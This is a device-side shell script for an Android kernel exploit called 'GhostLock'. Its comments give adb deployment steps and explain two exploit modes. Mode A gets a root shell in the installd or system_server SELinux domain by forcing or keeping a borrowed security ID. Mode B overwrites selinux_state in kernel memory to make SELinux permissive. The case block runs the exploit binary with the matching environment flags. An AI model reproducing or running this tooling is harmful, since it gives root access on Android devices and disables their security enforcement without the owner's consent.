#!/system/bin/sh
#
# GhostLock - A/B tests (device-side script)
#
#   adb push ghostlock /data/local/tmp/ghostlock
#   adb push test_both.sh /data/local/tmp/test_both.sh
#   adb shell chmod 755 /data/local/tmp/ghostlock /data/local/tmp/test_both.sh
#   adb shell -t
#
#   sh /data/local/tmp/test_both.sh a        # A: root shell as installd
#   sh /data/local/tmp/test_both.sh a-sys    # A: root shell as system_server
#   sh /data/local/tmp/test_both.sh b        # B: permissive, initialized kept
#
# ---------------------------------------------------------------- A ------
# Run the battery + root shell in a domain that already has the access,
# while SELinux stays enforcing (binder untouched):
#   GHOST_SID_ANY=1           force current_sid()
#   GHOST_SID_SCAN_CTX=...    locate that domain by context
#   GHOST_SID_KEEP=1          do NOT restore the shell SID
#   GHOST_SELINUX=0           mode 6 (cred only)
#
#   single line:
#     cd /data/local/tmp && GHOST_SID_ANY=1 GHOST_SID_SCAN_CTX=u:r:installd:s0 GHOST_SID_KEEP=1 GHOST_SELINUX=0 ./ghostlock --cred
#
# ---------------------------------------------------------------- B ------
# Store a page-aligned address of our reclaim page at selinux_state:
#   byte0 = 0        -> enforcing = 0        (permissive)
#   byte2 != 0       -> initialized != 0     (secid_to_secctx / binder OK)
# The extra kernel store lands in the page's unused scratch area.
#   GHOST_ENFORCE_INIT=1      use that value instead of the 8-byte zero
#   (mode 7 default: no GHOST_SELINUX=0)
#
#   single line:
#     cd /data/local/tmp && GHOST_ENFORCE_INIT=1 ./ghostlock --cred
#
# NOTE: B keeps selinux_state.policycap[0..4] as the pointer's upper bytes
# (all capabilities enabled). Harmless while enforcing=0. If page_base's
# phys bits 16..23 happen to be 0 (1/256), the "init check" line reports
# FAIL and you get the old binder breakage - just retry.

cd /data/local/tmp || exit 1
rm -f /data/local/tmp/.ghostlock_out /data/local/tmp/gl2_test_create.txt 2>/dev/null

case "$1" in
  a)
    GHOST_SID_ANY=1 GHOST_SID_SCAN_CTX=u:r:installd:s0 GHOST_SID_KEEP=1 GHOST_SELINUX=0 ./ghostlock --cred
    ;;
  a-sys)
    GHOST_SID_ANY=1 GHOST_SID_SCAN_CTX=u:r:system_server:s0 GHOST_SID_KEEP=1 GHOST_SELINUX=0 ./ghostlock --cred
    ;;
  b)
    GHOST_ENFORCE_INIT=1 ./ghostlock --cred
    ;;
  *)
    echo "usage: $0 a|a-sys|b"
    ;;
esac
